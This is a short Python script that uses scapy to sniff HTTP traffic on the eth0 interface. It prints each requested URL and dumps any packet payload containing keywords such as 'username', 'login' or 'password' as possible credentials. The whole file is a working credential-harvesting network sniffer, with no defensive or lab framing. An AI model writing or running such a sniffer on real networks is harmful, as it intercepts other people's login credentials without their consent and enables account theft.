#! /usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
def sniff(interface):
    scapy.sniff(iface = interface,store = False,prn = process_packet_sniff)
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        load = load.decode('utf-8')
        keywords = ["username", "user", "login", "admin", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_packet_sniff(packet):
    if packet.haslayer(http.HTTPRequest):

        url = get_url(packet)
        print("[+]HTTP request -> " + url.decode())
        login_info = get_login(packet)
        if login_info:
            print("\n\n [+] Possible login and passwords >" + login_info + "\n\n")


sniff("eth0")